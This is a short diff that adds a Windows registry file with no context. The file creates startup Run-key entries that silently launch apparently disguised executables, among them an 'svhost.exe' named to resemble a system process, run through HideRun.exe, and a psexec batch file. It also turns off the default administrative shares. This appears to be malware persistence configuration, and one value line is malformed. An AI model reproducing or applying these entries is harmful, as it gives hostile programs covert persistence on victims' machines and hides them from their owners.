@@ -1,0 +1,10 @@
+REGEDIT4
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"drvrmanager"="c:\\winnt\\system32\\drvrquery32.exe /S"
+"HideRun.exe"="c:\\winnt\\system32\\HideRun.exe c:\\winnt\\system32\\svhost.exe c:\\winnt\\system32\\pro.gif"
+"Xecuter.bat"=c:\\winnt\\system32\\psexec.bat"
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters]
+"AutoShareWks"=dword:00000000
+"AutoShareServer"=dword:00000000
